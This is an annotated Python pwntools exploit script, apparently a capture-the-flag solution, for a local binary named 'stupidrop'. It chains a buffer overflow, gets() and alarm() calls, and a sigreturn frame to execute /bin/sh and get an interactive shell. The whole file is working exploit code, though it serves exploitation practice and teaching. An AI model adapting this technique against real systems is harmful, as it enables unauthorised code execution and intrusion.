import pwn
import struct

# stupidrop is a 64-bit dynamically linked binary
# NX is enabled, ASLR is on

# This exploit involves using gets() to write /bin/sh to memory
# Using the return value of alarm -> rax to setup a syscall
# and then executing a syscall gadget

# There are two ways to do this exploit.
# One is to setup a standard execve syscall, relying on the fact that rdx happens to be 0x0 already
# the other is to setup a sigreturn syscall, which in turn sets up the standard execve syscall

# Both versions are in this folder
# This is the srop version

target = pwn.process('./stupidrop')
target_elf = pwn.ELF('stupidrop')

pwn.context.arch = "amd64"

# pop rdi gadget
pop_rdi = struct.pack("<Q", 0x4006a3)

###################################
#### Writing /bin/sh to memory ####
###################################

# Using vmmap, we find 0x601040 is a writeable part of memory filled with just 0s
# This is where we will choose to write /bin/sh
# We will write using the gets plt entry
gets_plt = struct.pack("<Q", target_elf.symbols['gets'])

##############################
#### Getting 0xf into rax ####
##############################

# We don't have any useable gadgets that will allow us to get a value into rax
# We can look for these with ropper with:
# ropper --file stupidrop --search "% ?ax"
# % means any word. ? means any letter

# We instead, can use the alarm() function, which is called at the start of the binary
# to set the value in rax. return values are stored in rax

# alarm() is used to specify how many seconds to wait before generating a SIGALRM
# It takes an unsigned int specifying the amount of seconds. If we call alarm once, it will set
# the number of seconds (return value will be 0)
# If we call it a second time with an argument of 0, it will cancel the pending alarm and
# return the number of seconds remaining

# So, we will call it once with 0xf as parameter, 
# and then immediately again with 0x0 as parameter
alarm_plt = struct.pack("<Q", target_elf.symbols['alarm'])

# Syscall gadget:
# ropper --file stupidrop --search "syscall"
# 0x40063e
syscall = struct.pack("<Q", 0x40063e)

####################################
#### Setting up sigreturn frame ####
####################################

# We don't have any good gadgets for changing the value in rdx
# It fortunately is 0x0 as is, so we could just do a regular
# execve(0x3b, bin_sh_mem_addr, 0x0, 0x0) syscall

# However, thats not really the point of this one
# Instead we will do a sigreturn frame which will setup a execve syscall

frame = pwn.SigreturnFrame()
frame.rip = 0x40063e # syscall instruction
frame.rax = 0x3b
frame.rdi = 0x601040 # memory addr where we write /bin/sh
frame.rsi = 0x0
frame.rdx = 0x0


################################
#### Assembling the Payload ####
################################

payload = b'a' * 56 # distance to return addr control

# '/bin/sh' -> writeable mem (0x601040)
payload += pop_rdi
payload += struct.pack("<Q", 0x601040)
payload += gets_plt

# 0xf -> rax
payload += pop_rdi
payload += struct.pack("<Q", 0xf)
payload += alarm_plt
payload += pop_rdi
payload += struct.pack("<Q", 0x0)
payload += alarm_plt

payload += syscall # sigreturn syscall (0xf is now in rax)
payload += bytes(frame) # put the frame on the top of the stack

target.sendline(payload)

target.sendline("/bin/sh") # when our gets plt is executed

target.interactive()